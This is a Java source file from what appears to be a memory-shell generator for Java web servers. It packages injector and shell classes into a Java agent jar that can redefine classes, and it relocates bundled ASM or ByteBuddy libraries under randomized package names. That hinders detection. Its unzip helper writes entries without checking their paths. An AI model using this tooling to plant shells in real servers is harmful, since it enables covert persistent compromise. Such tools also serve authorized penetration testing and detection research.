package com.reajason.javaweb.memshell.packer.jar;

import com.reajason.javaweb.asm.ClassRenameUtils;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import org.apache.commons.io.IOUtils;
import org.objectweb.asm.Opcodes;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Enumeration;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

/**
 * @author ReaJason
 * @since 2025/1/1
 */
public class AgentJarPacker implements JarPacker {

    static Path tempBootPath;

    @Override
    @SneakyThrows
    public byte[] packBytes(GenerateResult generateResult) {
        String mainClass = generateResult.getInjectorClassName();
        String advisorClass = generateResult.getShellClassName();

        Manifest manifest = new Manifest();
        manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
        manifest.getMainAttributes().putValue("Agent-Class", mainClass);
        manifest.getMainAttributes().putValue("Premain-Class", mainClass);
        manifest.getMainAttributes().putValue("Can-Redefine-Classes", "true");
        manifest.getMainAttributes().putValue("Can-Retransform-Classes", "true");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        String RELOCATE_PREFIX = CommonUtil.getRandomPackageName().replace(".", "/") + "/";
        boolean RELOCATE_ENABLED = true;

        try (JarOutputStream targetJar = new JarOutputStream(byteArrayOutputStream, manifest)) {
            String dependencyPackageName = null;
            if (generateResult.getShellConfig().getShellType().endsWith("ASM")) {
                dependencyPackageName = Opcodes.class.getPackage().getName();
                addDependency(targetJar, Opcodes.class, true, RELOCATE_PREFIX);
            } else {
                RELOCATE_ENABLED = false;
                dependencyPackageName = ByteBuddy.class.getPackage().getName();
                addDependency(targetJar, ByteBuddy.class, false, RELOCATE_PREFIX);
            }

            byte[] injectorBytes = generateResult.getInjectorBytes();
            if (RELOCATE_ENABLED) {
                injectorBytes = ClassRenameUtils.relocateClass(injectorBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
            }
            targetJar.putNextEntry(new JarEntry(mainClass.replace('.', '/') + ".class"));
            targetJar.write(injectorBytes);
            targetJar.closeEntry();

            byte[] shellBytes = generateResult.getShellBytes();
            if (RELOCATE_ENABLED) {
                shellBytes = ClassRenameUtils.relocateClass(shellBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
            }
            targetJar.putNextEntry(new JarEntry(advisorClass.replace('.', '/') + ".class"));
            targetJar.write(shellBytes);
            targetJar.closeEntry();

            for (Map.Entry<String, byte[]> entry : generateResult.getInjectorInnerClassBytes().entrySet()) {
                targetJar.putNextEntry(new JarEntry(entry.getKey().replace('.', '/') + ".class"));
                byte[] innerClassBytes = entry.getValue();
                if (RELOCATE_ENABLED) {
                    innerClassBytes = ClassRenameUtils.relocateClass(innerClassBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
                }
                targetJar.write(innerClassBytes);
                targetJar.closeEntry();
            }
        }
        return byteArrayOutputStream.toByteArray();
    }

    @SneakyThrows
    public static void addDependency(JarOutputStream targetJar, Class<?> baseClass, boolean relocate, String relocatePrefix) {
        String packageToMove = baseClass.getPackage().getName().replace('.', '/');
        URL sourceUrl = baseClass.getProtectionDomain().getCodeSource().getLocation();
        String sourceUrlString = sourceUrl.toString();
        if (sourceUrlString.contains("!BOOT-INF")) {
            String path = sourceUrlString.substring("jar:nested:".length());
            path = path.substring(0, path.indexOf("!/"));
            String[] split = path.split("/!");
            String bootJarPath = split[0];
            String internalJarPath = split[1];
            if (tempBootPath == null) {
                tempBootPath = Files.createTempDirectory("mem-shell-boot");
                unzip(bootJarPath, tempBootPath.toFile().getAbsolutePath());
            }
            sourceUrl = tempBootPath.resolve(internalJarPath).toUri().toURL();
        }
        JarFile sourceJar = new JarFile(new File(sourceUrl.toURI()));
        Enumeration<JarEntry> entries = sourceJar.entries();
        while (entries.hasMoreElements()) {
            JarEntry entry = entries.nextElement();
            String entryName = entry.getName();
            if (entryName.startsWith(packageToMove)) {
                InputStream entryStream = sourceJar.getInputStream(entry);
                byte[] bytes = IOUtils.toByteArray(entryStream);
                if (relocate) {
                    targetJar.putNextEntry(new JarEntry(relocatePrefix + entryName));
                    if (bytes.length > 0) {
                        bytes = ClassRenameUtils.relocateClass(bytes, packageToMove, relocatePrefix + packageToMove);
                    }
                } else {
                    targetJar.putNextEntry(new JarEntry(entryName));
                }
                targetJar.write(bytes);
                targetJar.closeEntry();
                entryStream.close();
            }
        }
        sourceJar.close();
    }

    @SneakyThrows
    public static void unzip(String jarPath, String tempPath) {
        try (JarFile jarFile = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jarFile.entries();
            while (entries.hasMoreElements()) {
                JarEntry jarEntry = entries.nextElement();
                String entryName = jarEntry.getName();
                File file = new File(tempPath, entryName);
                if (jarEntry.isDirectory()) {
                    file.mkdir();
                } else {
                    InputStream inputStream = null;
                    FileOutputStream outputStream = null;
                    try {
                        inputStream = jarFile.getInputStream(jarEntry);
                        outputStream = new FileOutputStream(file);
                        IOUtils.copy(inputStream, outputStream);
                    } finally {
                        IOUtils.closeQuietly(inputStream);
                        IOUtils.closeQuietly(outputStream);
                    }
                }
            }
        }
    }
}